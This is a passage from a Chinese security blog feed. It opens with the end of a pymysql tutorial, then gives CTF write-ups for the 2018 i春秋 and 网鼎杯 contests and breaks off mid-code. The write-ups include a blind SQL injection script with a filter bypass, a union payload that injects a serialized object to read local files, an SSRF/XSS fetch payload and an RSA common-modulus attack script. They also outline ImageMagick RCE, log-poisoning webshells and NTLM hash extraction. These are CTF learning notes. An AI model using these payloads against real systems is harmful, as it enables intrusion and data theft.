title="pymysql操作mysql数据库"></a>pymysql操作mysql数据库</h1><h2 id="适用环境"><a href="#适用环境" class="headerlink" title="适用环境"></a>适用环境</h2><p>python版本 &gt;=2.6或3.3，mysql版本&gt;=4.1。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>可以使用pip安装也可以手动下载安装。<br>使用pip安装，在命令行执行如下命令：</p><pre><code>pip install PyMySQL</code></pre><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><h3 id="连接数据库如下-："><a href="#连接数据库如下-：" class="headerlink" title="连接数据库如下 ："></a>连接数据库如下 ：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pymysql.cursors</span><br><span class="line"></span><br><span class="line"># Connect to the database</span><br><span class="line">connection &#x3D; pymysql.connect(host&#x3D;&#39;127.0.0.1&#39;,</span><br><span class="line">                             port&#x3D;3306,</span><br><span class="line">                             user&#x3D;&#39;root&#39;,</span><br><span class="line">                             password&#x3D;&#39;zhyea.com&#39;,</span><br><span class="line">                             db&#x3D;&#39;employees&#39;,</span><br><span class="line">                             charset&#x3D;&#39;utf8mb4&#39;,</span><br><span class="line">                             cursorclass&#x3D;pymysql.cursors.DictCursor)</span><br></pre></td></tr></table></figure><p>也可以使用字典进行连接参数的管理，我觉得这样子更优雅一些：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pymysql.cursors</span><br><span class="line"></span><br><span class="line">config &#x3D; &#123;</span><br><span class="line">          &#39;host&#39;:&#39;127.0.0.1&#39;,</span><br><span class="line">          &#39;port&#39;:3306,</span><br><span class="line">          &#39;user&#39;:&#39;root&#39;,</span><br><span class="line">          &#39;password&#39;:&#39;zhyea.com&#39;,</span><br><span class="line">          &#39;db&#39;:&#39;employees&#39;,</span><br><span class="line">          &#39;charset&#39;:&#39;utf8mb4&#39;,</span><br><span class="line">          &#39;cursorclass&#39;:pymysql.cursors.DictCursor,</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line"># Connect to the database</span><br><span class="line">connection &#x3D; pymysql.connect(**config)</span><br></pre></td></tr></table></figure><p>很重要的一点，这里需要定义一个cursor对象，并通过此对象来操作数据库。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用 cursor() 方法创建一个游标对象 cursor</span><br><span class="line">cursor &#x3D; db.cursor()</span><br></pre></td></tr></table></figure><h3 id="写入数据的代码："><a href="#写入数据的代码：" class="headerlink" title="写入数据的代码："></a>写入数据的代码：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from datetime import date, datetime, timedelta </span><br><span class="line">import pymysql.cursors</span><br><span class="line"></span><br><span class="line">#连接配置信息</span><br><span class="line">config &#x3D; &#123;</span><br><span class="line">          &#39;host&#39;:&#39;127.0.0.1&#39;,</span><br><span class="line">          &#39;port&#39;:3306,</span><br><span class="line">          &#39;user&#39;:&#39;root&#39;,</span><br><span class="line">          &#39;password&#39;:&#39;zhyea.com&#39;,</span><br><span class="line">          &#39;db&#39;:&#39;employees&#39;,</span><br><span class="line">          &#39;charset&#39;:&#39;utf8mb4&#39;,</span><br><span class="line">          &#39;cursorclass&#39;:pymysql.cursors.DictCursor,</span><br><span class="line">          &#125;</span><br><span class="line"># 创建连接</span><br><span class="line">connection &#x3D; pymysql.connect(**config)</span><br><span class="line"></span><br><span class="line"># 执行sql语句</span><br><span class="line">try:</span><br><span class="line">    with connection.cursor() as cursor:</span><br><span class="line">        # 执行sql语句，插入记录</span><br><span class="line">        sql &#x3D; &#39;INSERT INTO employees (first_name, last_name, hire_date, gender, birth_date) VALUES (%s, %s, %s, %s, %s)&#39;</span><br><span class="line">        cursor.execute(sql, (&#39;Robin&#39;, &#39;Zhyea&#39;, tomorrow, &#39;M&#39;, date(1989, 6, 14)));</span><br><span class="line">    # 没有设置默认自动提交，需要主动提交，以保存所执行的语句</span><br><span class="line">    connection.commit()</span><br><span class="line"></span><br><span class="line">finally:</span><br><span class="line">    connection.close();</span><br></pre></td></tr></table></figure><p>执行sql语句前需要获取cursor，因为配置默认自动提交，故在执行sql语句后需要主动commit，最后不要忘记关闭连接。</p><h3 id="执行查询："><a href="#执行查询：" class="headerlink" title="执行查询："></a>执行查询：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding: utf-8</span><br><span class="line">import pymysql</span><br><span class="line">from datetime import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 数据库配置</span><br><span class="line">mysql_config&#x3D;&#123;</span><br><span class="line">    &#39;host&#39;:&#39;localhost&#39;,</span><br><span class="line">    &#39;port&#39;:3306,</span><br><span class="line">    &#39;user&#39;:&#39;root&#39;,</span><br><span class="line">    &#39;password&#39;:&#39;meimima123&#39;,</span><br><span class="line">    &#39;db&#39;:&#39;flask&#39;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">db &#x3D; pymysql.connect(**mysql_config)</span><br><span class="line"># 使用 cursor() 方法创建一个游标对象 cursor</span><br><span class="line">cursor &#x3D; db.cursor()</span><br><span class="line"></span><br><span class="line">sql &#x3D; &quot;select * from users;&quot;</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">res &#x3D; cursor.fetchone()</span><br><span class="line">print res</span><br><span class="line">print &#39;---------------------&#39;</span><br><span class="line">sql &#x3D; &quot;select * from users;&quot;</span><br><span class="line">cursor.execute(sql)</span><br><span class="line">res2 &#x3D; cursor.fetchall()</span><br><span class="line">print res2</span><br></pre></td></tr></table></figure><p>这里的查询<code>fetchone()</code>只取了一条查询结果，查询结果以元组的形式返回。<br><code>fetchall()</code>取所有查询结果，以元组的元组形式返回。<br>查询结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;110&#39;, &#39;olivia&#39;, &#39;698d51a19d8a121ce581499d7b701668&#39;, 999912.0)</span><br><span class="line">---------------------</span><br><span class="line">((&#39;110&#39;, &#39;olivia&#39;, &#39;698d51a19d8a121ce581499d7b701668&#39;, 999912.0), (&#39;178&#39;, &#39;v0w&#39;, &#39;202cb962ac59075b964b07152d234b70&#39;, 91111.0))</span><br></pre></td></tr></table></figure><h1 id="使用Bootstrap美化页面"><a href="#使用Bootstrap美化页面" class="headerlink" title="使用Bootstrap美化页面"></a>使用Bootstrap美化页面</h1><ol><li><a href="http://www.bootcss.com/">Bootstrap中文文档</a></li><li><a href="https://v3.bootcss.com/getting-started/#examples-navbars">bootstrap起步</a></li><li><a href="https://www.bootcdn.cn/">bootcdn加速</a></li></ol><p>这个其实没什么，单纯的美化，单纯的看到好看的直接复制粘贴，改一改就行。</p><h1 id="其他调试及注意事项"><a href="#其他调试及注意事项" class="headerlink" title="其他调试及注意事项"></a>其他调试及注意事项</h1><h2 id="FireFox调试模式"><a href="#FireFox调试模式" class="headerlink" title="FireFox调试模式"></a>FireFox调试模式</h2><p>在不刷新缓存的情况下，我们代码新的执行结果是不会显示在浏览器页面的，浏览器会选择缓存中的已有数据来显示，这也就需要我们关闭缓存。</p><p>Firefox火狐浏览器web开发调试开启强制刷新缓存模式<br>火狐浏览器地址栏输入：about:config</p><pre><code>1.找到browser.cache.check_doc_frequency       双击将3改成12.找到browser.cache.disk.enable               把true改为 false3.找到browser.cache.memory.enable             把true改为 false</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://space.bilibili.com/349929259/#/">bilibili视频-python-flask零基础到项目实战</a></li><li><a href="http://docs.jinkan.org/docs/flask/">官方文档——中文版</a></li><li><a href="http://docs.jinkan.org/docs/jinja2/api.html">jinja2文档</a></li><li><a href="http://www.zhyea.com/2015/08/20/using-pymysql.html">使用pymysql笔记</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋巅峰极客赛第二轮WP</title>
      <link href="/2018/08/26/i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E8%B5%9B-%E7%AC%AC%E4%BA%8C%E8%BD%AEwp/"/>
      <url>/2018/08/26/i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E8%B5%9B-%E7%AC%AC%E4%BA%8C%E8%BD%AEwp/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>sqli<br>简单的sql约束攻击<br>注册账号<code>admin    </code>,密码随意，然后登陆就得到flag了</p><pre><code>flag&#123;b5a1f9c5-ac30-4e88-b460-e90bcb65bd70&#125;</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>关注公众号得到前半部分的flag。</p><pre><code>flag&#123;71d7ce04-197a-4d</code></pre><p>winhex打开，没发现什么，但是开头是PK这是word的性质————word相当于格式文件XML和内容的压缩包，可以利用这一性质，解压word.zip<br>得到xml文件，在其中一个xml文件中发现另外一部分。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180826/lhaDKb7cHF.png?imageslim" alt="mark"></p><pre><code>b3-9c1d-0c419406a594&#125;</code></pre><p>后来发现原来在这里：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180826/mF5dD2CFI0.png?imageslim" alt="mark"></p><pre><code>flag&#123;71d7ce04-197a-4db3-9c1d-0c419406a594&#125;</code></pre><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>共模攻击<br>相同的n，不同的e1,e2加密得到不同的c1,c2<br>首先要对加密文件解成数字：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from Crypto.Util.number import long_to_bytes,bytes_to_long</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">file1 &#x3D; open(&quot;flag1.enc&quot;,&quot;rb&quot;).read()</span><br><span class="line">file2 &#x3D; open(&quot;flag2.enc&quot;,&quot;rb&quot;).read()</span><br><span class="line">print bytes_to_long(base64.b64decode(file1))</span><br><span class="line">print bytes_to_long(base64.b64decode(file2))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后利用脚本共模攻击：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys   </span><br><span class="line">sys.setrecursionlimit(1000000)</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">    if a &#x3D;&#x3D; 0:</span><br><span class="line">      return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">      g, y, x &#x3D; egcd(b % a, a)</span><br><span class="line">      return (g, x - (b &#x2F;&#x2F; a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y &#x3D; egcd(a, m)</span><br><span class="line">    if g !&#x3D; 1:</span><br><span class="line">      raise Exception(&#39;modular inverse does not exist&#39;)</span><br><span class="line">    else:</span><br><span class="line">      return x % m</span><br><span class="line"></span><br><span class="line">c1&#x3D;11757177168629974661319129065020939259607843855964612407515015619551332717303594939284265148421101106538576564879770344246694669035164564635188309876801896156214909946098869029964618647606449218025915092461416329529723153695631060387903820322776063152970417682658882514448192870115306139048632667164375339647480060498038060662339943872320998391726896418231367745182167642401094985859083528539732718585607300300744481583877075988159078923393794888199752412273065186387778708588318818871255432956112609603017152148063465689319082652284861285738454428311471661017770501362483439955249552527930663707069794266908382237863</span><br><span class="line">c2&#x3D;2364848878397323871885597084235162950454738150033561990125608234733186785294327511676322556989693319543787881108157790541032502889824032246849038028277601291878651138223131738210948288040172974610279550123399373111991951111719314902078119305973622147396199257818150347936553495169543808071509800280778646769553776723985138633331947024508645378935223338224527962766707863670722941767067705851822587652625805245801727869961524972624327839027498877534264770109063202217409037083612774983213841234965045214820133529399280883524064963136158251681946077429913578531311243649928666453318570284124743168193304356485791847813</span><br><span class="line">n&#x3D;17362520124149736059291605717839814089431261833972408175766504894876091272021197374480215582589878198406028065354454242540322618614670160317701698407729515781811530180885334265851364490357884909336085410775168953942120359215038925025305363480538685487988827339463890539279008285241711326041868183805848503077373967082910932422798165242481154593794712639251157856102009630894845049984346776659339380886766804814959778048440996937820138560802077375885700500737699904011032451007341777160586467318264288370080315519305800247682611802774996999330812534723806925426052547128371180683265963525581842037399869323246530085399</span><br><span class="line">e1&#x3D;2333</span><br><span class="line">e2&#x3D;23333</span><br><span class="line"></span><br><span class="line">s &#x3D; egcd(e1, e2)</span><br><span class="line">s1 &#x3D; s[1]</span><br><span class="line">s2 &#x3D; s[2]</span><br><span class="line">if s1&lt;0:</span><br><span class="line">   s1 &#x3D; - s1</span><br><span class="line">   c1 &#x3D; modinv(c1, n)</span><br><span class="line">elif s2&lt;0:</span><br><span class="line">   s2 &#x3D; - s2</span><br><span class="line">   c2 &#x3D; modinv(c2, n)</span><br><span class="line">m&#x3D;(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line">print &#39;&#123;:x&#125;&#39;.format(m).decode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure><p>GETflag。</p><pre><code>flag&#123;4b0b4c8a-82f3-4d80-902b-8e7a5706f8fe&#125;</code></pre><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="偷梁换柱"><a href="#偷梁换柱" class="headerlink" title="偷梁换柱"></a>偷梁换柱</h2><blockquote><p>赛题是那样无情残忍，无义无理取闹，稍有踟蹰，他就偷梁换柱。</p><ol><li><p>提交后台admin用户的密码</p></li><li><p>提交系统管理员ichunqiu用户的全名</p></li><li><p>提交/tmp/access.log的内容的前16位</p></li></ol></blockquote><h3 id="第一题-信息收集"><a href="#第一题-信息收集" class="headerlink" title="第一题 信息收集"></a>第一题 信息收集</h3><p><code>.git</code>源码泄露，githack打一波，发现数据库文件，拿到数据库的账户密码。</p><h3 id="第二题-用户泄露"><a href="#第二题-用户泄露" class="headerlink" title="第二题 用户泄露"></a>第二题 用户泄露</h3><p>登录后台，发现有个上传功能，但是自动加上<code>.png</code>后缀，绕不过。</p><p>查看源码发现<code>classes/picture.php</code>中用到<code>ImageMagick</code>，利用现成的exp可以实现RCE，然后读取<code>/etc/passwd</code>即可。</p><p><a href="https://github.com/Medicean/VulApps/blob/master/i/imagemagick/1/poc.py">CVE-2016–3714 ImageMagick参考链接</a></p><h3 id="第三题-程序逻辑"><a href="#第三题-程序逻辑" class="headerlink" title="第三题 程序逻辑"></a>第三题 程序逻辑</h3><p>同样是利用<code>ImageMagick</code>,读取<code>/tmp/access.log</code>即可。</p><h2 id="反客为主"><a href="#反客为主" class="headerlink" title="反客为主"></a>反客为主</h2><blockquote><p>以静谋动，反客为主，掌握真正的大权，才能不任人摆布。</p><ol><li><p>提交phpStudy目录下Documents.txt的内容</p></li><li><p>提交系统用户/ichunqiu的密码</p></li><li><p>提交ichunqiu用户Desktop根目录password.txt的内容</p></li></ol></blockquote><h3 id="第一题-文件读取"><a href="#第一题-文件读取" class="headerlink" title="第一题 文件读取"></a>第一题 文件读取</h3><p>打开后扫描发现有文件包含，直接包含<code>Document.txt</code>从而读取文件内容</p><h3 id="第二题-抓取密码"><a href="#第二题-抓取密码" class="headerlink" title="第二题 抓取密码"></a>第二题 抓取密码</h3><p>利用包含漏洞，包含<code>accesss,log</code>来getshell，然后利用工具读取NTLM hash，反解得到明文</p><h3 id="第三题-尝试登录"><a href="#第三题-尝试登录" class="headerlink" title="第三题 尝试登录"></a>第三题 尝试登录</h3><p>getshell后，发现权限是administrator,直接在菜刀中打开<code>ichunqiu</code>账户的桌面就可以看到</p><h2 id="瞒天过海"><a href="#瞒天过海" class="headerlink" title="瞒天过海"></a>瞒天过海</h2><blockquote><p>目的不是为了瞒天，只是做出题目的一种手段。</p><ol><li>提交后台管理员密码</li><li>提交mysql密码</li><li>提交C盘根目录password.txt</li></ol></blockquote><h3 id="第一题-初探后台"><a href="#第一题-初探后台" class="headerlink" title="第一题-初探后台"></a>第一题-初探后台</h3><p>发现存在注入，直接注入得知有users表，表中有id,login,password列，然后注入获得密码</p><h3 id="第二题-获得密码"><a href="#第二题-获得密码" class="headerlink" title="第二题- 获得密码"></a>第二题- 获得密码</h3><p>注入点权限为root，直接读取mysql.user的password列，然后反解mysql的hash</p><h3 id="第三题-DB提权"><a href="#第三题-DB提权" class="headerlink" title="第三题-DB提权"></a>第三题-DB提权</h3><p>利用注入点直接load_file()写一个小马即可</p><h2 id="暗渡成仓"><a href="#暗渡成仓" class="headerlink" title="暗渡成仓"></a>暗渡成仓</h2><blockquote><p>虚实相接，需要出题者以声东击西的招式准备的歧路，找到正确的栈道。</p><ol><li><p>提交后台管理员密码</p></li><li><p>提交系统管理员Hack的全名</p></li><li><p>超级管理员用户桌面根目录admin.txt文件的内容</p></li></ol></blockquote><h3 id="第一题-初探后台-1"><a href="#第一题-初探后台-1" class="headerlink" title="第一题-初探后台"></a>第一题-初探后台</h3><p>扫描发现存在上传点，上传php发现无法上传，利用大写即可绕过然后getshell</p><h3 id="第二题-获取用户"><a href="#第二题-获取用户" class="headerlink" title="第二题- 获取用户"></a>第二题- 获取用户</h3><p>getshell后直接net user即可得到</p><h3 id="第三题-日志收集"><a href="#第三题-日志收集" class="headerlink" title="第三题-日志收集"></a>第三题-日志收集</h3><p>getshell后发现为最高权限，直接菜刀找到<code>c:\documents and sttings\administrator\桌面\admin.txt</code>，读取即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018第一场WEB&amp;Misc WP</title>
      <link href="/2018/08/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018%E7%AC%AC%E4%B8%80%E5%9C%BAWEB&amp;Misc%20WP/"/>
      <url>/2018/08/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018%E7%AC%AC%E4%B8%80%E5%9C%BAWEB&amp;Misc%20WP/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯2018第一场WEB-amp-Misc-WP"><a href="#网鼎杯2018第一场WEB-amp-Misc-WP" class="headerlink" title="网鼎杯2018第一场WEB&amp;Misc WP"></a>网鼎杯2018第一场WEB&amp;Misc WP</h1><p>深感CTF对WEB的恶意，WEB狗没有出路啊！！！一开始<code>0 WEB 7 PWN</code>,两个WEB最后才放出来，MISC的题目，脑洞又有点大，Crypto感觉无解，总之被锤爆==、</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="facebook"><a href="#facebook" class="headerlink" title="facebook"></a>facebook</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>注册登陆用户</p><p>发现可以点击，跳转到<br><code>http://bae5d1e77d0948db94689fd87a2bc01880521f8e11c042b2.game.ichunqiu.com/view.php?no=1</code></p><p>简单判断是注入点<br>之后检测过滤select，可以用<code>/*!select*/</code>绕过。</p><p>判断列数时，发现<br><code>http://bae5d1e77d0948db94689fd87a2bc01880521f8e11c042b2.game.ichunqiu.com/view.php ?no=0 union/*!select*/ 1,2,3,4 #</code></p><blockquote></blockquote><p>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</p><blockquote><p>相当于有提示：反序列化</p></blockquote><p>于是可以sql注入(布尔盲注)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;bae5d1e77d0948db94689fd87a2bc01880521f8e11c042b2.game.ichunqiu.com&#x2F;view.php?no&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    data&#x3D;url+payload</span><br><span class="line">    r&#x3D;requests.get(data).content</span><br><span class="line">    #print r</span><br><span class="line">    return &quot;www.baidu.com&quot; in r</span><br><span class="line"></span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">s&#x3D;r&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_:&#123;&#125;&quot;;\&#39;,\.&#39;</span><br><span class="line">for i in range(1,99):</span><br><span class="line">    for c in s:</span><br><span class="line">        # payload&#x3D;&quot;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;),%d,1)&#x3D;&#39;%s&#39;),1,0)&quot;%(i,c)</span><br><span class="line">        ## no,username,passwd,data</span><br><span class="line">        payload&#x3D;&quot;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),%d,1)&#x3D;&#39;%s&#39;),1,0)&quot;%(i,c)</span><br><span class="line">        ## nousernamepasswd</span><br><span class="line">        # payload&#x3D;&quot;if((substr((select data from users),%d,1)&#x3D;&#39;%s&#39;),1,0)&quot;%(i,c)</span><br><span class="line">        #print payload</span><br><span class="line">        if check(payload):</span><br><span class="line">            #print c</span><br><span class="line">            flag+&#x3D;c</span><br><span class="line">            break</span><br><span class="line">    print flag</span><br><span class="line">## O:8:&quot;userinfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;v0w&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读出data是反序列化后的数据<code>O:8:&quot;userinfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;v0w&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>    </p><p>在<code>view.php</code>会显示<code>the contents of his/her blog</code></p><p>构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bae5d1e77d0948db94689fd87a2bc01880521f8e11c042b2.game.ichunqiu.com&#x2F;view.php</span><br><span class="line">?no&#x3D;0 union &#x2F;*!select*&#x2F; 1,2,3,&#39;O:8:&quot;userinfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;v0w&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; #</span><br></pre></td></tr></table></figure><p>查看页面源代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2MDA3NGYyNS00NTJkLTRlMTctYTE3NC05Zjc4NzFiMGY2ZGF9IjsNCmV4aXQoMCk7DQo&#x3D;&#39;&gt;</span><br></pre></td></tr></table></figure><p>解码得到flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;60074f25-452d-4e17-a174-9f7871b0f6da&#125;&quot;;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{60074f25-452d-4e17-a174-9f7871b0f6da}</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>SQL盲注，反序列化</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="clip"><a href="#clip" class="headerlink" title="clip"></a>clip</h2><p>Winhex打开，搜索<code>idat</code></p><p>发现有PNG<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/E4BfdI5FCL.png?imageslim" alt="mark"></p><p>继续查找发现还有一张，但是缺少文件头<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/9Id0KlmEDK.png?imageslim" alt="mark"></p><p>补充文件头，提取两张png文件，<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/4F4DF7LJkd.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/cJJ6ea8JkH.png?imageslim" alt="mark"></p><p>然后发现图片内容有点错位，剪切开来<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/d8ig6dF88I.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/6cAEcI7gA7.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/HaiECm9KcJ.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/eJBBCe2i42.png?imageslim" alt="mark"></p><p>PS修复，修复完这样的 F**K<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/BHc5hCcl3i.png?imageslim" alt="mark"></p><hr><p>以下为补充的正确的做法：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180827/8g7jkC5fF8.png?imageslim" alt="mark"></p><p>噪声套路是每隔多少字节会加一个<code>XX XX XX XX 78 01 01 00 04 FF FB</code>（这里纠正一下原文的代码）</p><p>所以只要将这些字节（11B）删除即可。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180827/F8iCIa0Em1.png?imageslim" alt="mark"></p><p>结果：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180827/D61lm6KGm7.png?imageslim" alt="mark"><br>非常nice</p><h2 id="minified"><a href="#minified" class="headerlink" title="minified"></a>minified</h2><p>解压出来是一张图片，像马赛克一样<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/67I1DL3jK8.png?imageslim" alt="mark"></p><p>让我想到了TJCTF的一道隐写题：<br><a href="https://static.tjctf.org/01a68dd1c1db3bb4eb69853b32cb4dbbc22c6c05abf994733e99b928c20c5295_interference.zip">原题链接</a><br><a href="https://qingchenldl.github.io/2018/08/14/TJCTF%20WP/#interference">解题思路</a></p><p>那个题是两张图片，做一些运算<code>IMG1 ^ SUB（IMG1，IMG2）</code>，得到flag的图片</p><p>但是这个只有一张图片，<br>又看到位深32，想到了可能和透明度，alpha通道有关，于是StegoSlove 提取了alpha0-7通道，然后又提取了blue0-7通道图像，green0-7通道图像，发现red0是没有图像的，怀疑red不是，暂时舍弃。</p><p>将得到的图像与alpha通道图像之间比较，异或，发现<code>green0^alpha0</code>得到flag<br>green0<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/E85GjaicKC.png?imageslim" alt="mark"><br>alpha0<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/hh0C5Ajg66.png?imageslim" alt="mark"><br>alpha0^green0=flag<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/eEFbghILCC.bmp" alt="mark"></p><hr><p>以下是官方WP发出后，补充学习的</p><h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h2><p>hint:动态爬虫，Redis Getshell。8000端口存在apache2</p><p>这么多hint，都没做出来 emmmm 太菜了==、</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/H7GJaF9mH2.png?imageslim" alt="mark"></p><p>搜集信息，看到爬虫，查看robots.txt<br>果然有东西</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;get_sourcecode</span><br></pre></td></tr></table></figure><p>但是不允许直接读：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NOT 127.0.0.1</span><br></pre></td></tr></table></figure><p>想XFF，但是没用</p><p>这是回到index，发现还有个上传，难道还有上传漏洞<br>上传小马，无果，</p><p>去了解一下动态爬虫</p><blockquote><p>简单来说就是模拟人对浏览器的动作，可以用代码打开你的浏览器然后像人一样操作实现浏览器的自动化（打开网页、输入文字、提交表单等），安装等详细介绍在官方文档中有介绍。<br>也就是说，会执行网页中嵌入的js代码。</p></blockquote><p>有点像XSS，执行js代码，上传一个就XSS-js，发现弹窗了，nice，说明猜测正确。</p><p>接下来就是构造js代码,读取文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;a id&#x3D;&#39;test&#39; href&#x3D;&quot;&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;vendor&#x2F;jquery-1.11.1.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">        $.get(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;get_sourcecode&quot;,function(data)&#123;</span><br><span class="line">  document.getElementById(&quot;test&quot;).innerHTML&#x3D;data; </span><br><span class="line">&#125;);</span><br><span class="line">        </span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到源码<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/aGF20km23E.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 